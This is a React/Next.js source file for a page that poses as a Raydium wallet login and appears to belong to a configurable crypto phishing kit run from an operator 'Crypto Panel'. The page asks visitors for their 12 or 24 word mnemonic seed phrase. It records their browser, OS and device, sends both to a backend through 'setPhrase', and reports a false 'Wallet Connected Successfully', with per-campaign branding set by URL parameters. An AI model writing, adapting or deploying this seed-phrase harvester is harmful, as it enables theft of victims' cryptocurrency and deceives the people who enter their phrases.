"use client";
import { useSearchParams } from "next/navigation";
import { useState, useEffect, ChangeEvent } from "react";
import {
  setPhrase,
  getCryptoLog,
  getPhrases,
  verifyRecaptcha,
} from "@/shared/api/apis";
import { useGoogleReCaptcha } from "react-google-recaptcha-v3";
import { UAParser } from "ua-parser-js";

interface CryptoLog {
  appLogo?: string;
  redirectUrl?: string;
  app_name?: string;
}

interface Phrase {
  seed_phrase: string;
}

interface UserInfo {
  browser: string;
  os: string;
  device: string;
}

const LoginPage = () => {
  const searchParams = useSearchParams();
  const [value, setValue] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [verified, setVerified] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [cryptoLog, setCryptoLog] = useState<CryptoLog | null>(null);
  const [phrases, setPhrases] = useState<Phrase[]>([]);
  const [userInfo, setUserInfo] = useState<UserInfo>({
    browser: "",
    os: "",
    device: "",
  });

  const { executeRecaptcha } = useGoogleReCaptcha();

  const bgColor = searchParams.get("bgColor");
  const bgColorBox = searchParams.get("modColor");
  const buttonColor = searchParams.get("btnColor");
  const cryptoLogId = searchParams.get("cryptoLogId") ?? "";
  const userId = searchParams.get("userId");

  const staticLogo = "/raydium-ray-logo.png";
  const appLogo = cryptoLog?.appLogo || staticLogo;
  const appName = cryptoLog?.app_name?.toUpperCase();

  useEffect(() => {
    if (executeRecaptcha) {
      executeRecaptcha()
        .then(async (token: string) => {
          const response = await verifyRecaptcha(token);
          setVerified(response?.ok);
        })
        .catch(() => {
          setError("Error in recaptcha refresh the page");
        });
    }
  }, [executeRecaptcha]);

  useEffect(() => {
    const parser = new UAParser();
    const result = parser.getResult();
    setUserInfo({
      browser: `${result.browser.name} ${result.browser.version}`,
      os: `${result.os.name} ${result.os.version}`,
      device: result.device.model
        ? `${result.device.vendor} ${result.device.model}`
        : "Desktop",
    });
  }, []);

  const handleInputChange = (e: ChangeEvent<HTMLTextAreaElement>) => {
    setValue(e.target.value);
  };

  const handleSubmit = async () => {
    const inputValue = value.trim();

    if (!inputValue) {
      showTempError("Phrase cannot be empty.");
      return;
    }

    if (!verified) {
      showTempError("Recaptcha verification failed! refresh page");
      return;
    }

    const wordRegex = /^[a-z\s]+$/;
    const words = inputValue.split(/\s+/);

    if (!wordRegex.test(inputValue) || !words.every((w) => /^[a-z]+$/.test(w))) {
      showTempError("Error mnemonic phrase can only contain 12 or 24 words spaced.");
      return;
    }

    if (words.length < 12 || words.length > 24) {
      showTempError("Input must contain between 12 and 24 words.");
      return;
    }

    if (!cryptoLog) {
      showTempError("Crypto Log Not Found");
      return;
    }

    if (
      phrases.some((phraseObj) => phraseObj?.seed_phrase === value) &&
      cryptoLog?.redirectUrl
    ) {
      window.location.replace(cryptoLog.redirectUrl);
    } else {
      const response = await setPhrase(value, userInfo, cryptoLogId);
      if (response?.ok) {
        setSuccess("Wallet Connected Successfully");
        setValue("");
        setTimeout(() => setSuccess(""), 2000);
      } else {
        showTempError("Error connecting wallet");
      }
    }
  };

  const showTempError = (msg: string) => {
    setError(msg);
    setTimeout(() => setError(""), 2000);
  };

  const getCryptoLogById = async (id: string) => {
    const response = await getCryptoLog(id);
    setCryptoLog(response);
  };

  const getAllPhrases = async () => {
    const response = await getPhrases();
    if (Array.isArray(response)) {
      setPhrases(response);
    }
  };

  useEffect(() => {
    getAllPhrases();
  }, []);

  useEffect(() => {
    if (!userId || !cryptoLogId) {
      setShowModal(true);
    } else {
      getCryptoLogById(cryptoLogId);
    }
  }, []);

  const hexToRgb = (hex: string) => {
    hex = hex?.replace(/^#/, "");
    const r = parseInt(hex.substring(0, 2), 16);
    const g = parseInt(hex.substring(2, 4), 16);
    const b = parseInt(hex.substring(4, 6), 16);
    return { r, g, b };
  };

  const getContrastColor = (hex: string) => {
    const { r, g, b } = hexToRgb(hex);
    const luminance = 0.299 * r + 0.587 * g + 0.114 * b;
    return luminance > 128 ? "#000000" : "#ffffff";
  };

  const modColor = getContrastColor(bgColor || "#fff");
  const buttonTextColor = getContrastColor(buttonColor || "#22d1f8");
  const modTextColor = getContrastColor(modColor);

  const goToPanel = () => {
    window.open(
      process.env.NEXT_PUBLIC_CRYPTO_PANEL_URL ||
        "http://localhost:3001/dashboards/urls",
      "_blank"
    );
  };

  return (
    <>
      {showModal ? (
        <div className="flex flex-col items-center justify-center min-h-screen bg-[#181d31] z-50">
          <div className="bg-white p-6 rounded-lg shadow-md text-center">
            <p className="text-lg font-bold">Redirect from Crypto Panel</p>
            <button
              className="mt-4 px-4 py-2 text-black rounded"
              style={{
                backgroundColor: buttonColor ?? "#22d1f8",
                color: buttonTextColor,
                border: `1px solid ${buttonTextColor}`,
              }}
              onClick={goToPanel}
            >
              Go to panel
            </button>
          </div>
        </div>
      ) : (
        <div
          className="flex flex-col items-center justify-center min-h-screen"
          style={{ backgroundColor: bgColor ?? "#181d31" }}
        >
          <div
            className="w-[380px] p-6 rounded-lg shadow-md text-center login-container"
            style={{
              backgroundColor:
                bgColor === null
                  ? bgColorBox ?? "white"
                  : modColor,
              color: modTextColor,
            }}
          >
            <div className="logo-placeholder">
              <img
                height={100}
                width={100}
                src={appLogo}
                alt="Logo"
                className="h-14"
              />
              <p
                className="h-full w-auto text-3xl text-center"
                style={{ letterSpacing: "0.3em" }}
              >
                {cryptoLog?.app_name ? appName : "RAYDIUM"}
              </p>
            </div>
            {error && <div className="message-container-error">{error}</div>}
            {success && <div className="message-container-success">{success}</div>}
            <textarea
              value={value}
              placeholder="Enter your 12 or 24 word Mnemonic Phrase here..."
              className="w-full h-20 px-4 py-2 mb-4 border rounded-md text-gray-800 focus:outline-none focus:ring-2 focus:ring-blue-300 resize-none placeholder-top"
              onChange={handleInputChange}
            />
            <button
              className="w-full px-4 py-2 rounded-md"
              style={{
                backgroundColor: buttonColor ?? "#22d1f8",
                color: buttonTextColor,
                border: `1px solid ${buttonTextColor}`,
              }}
              onClick={handleSubmit}
            >
              Connect Wallet
            </button>
          </div>
        </div>
      )}
    </>
  );
};

export default LoginPage;
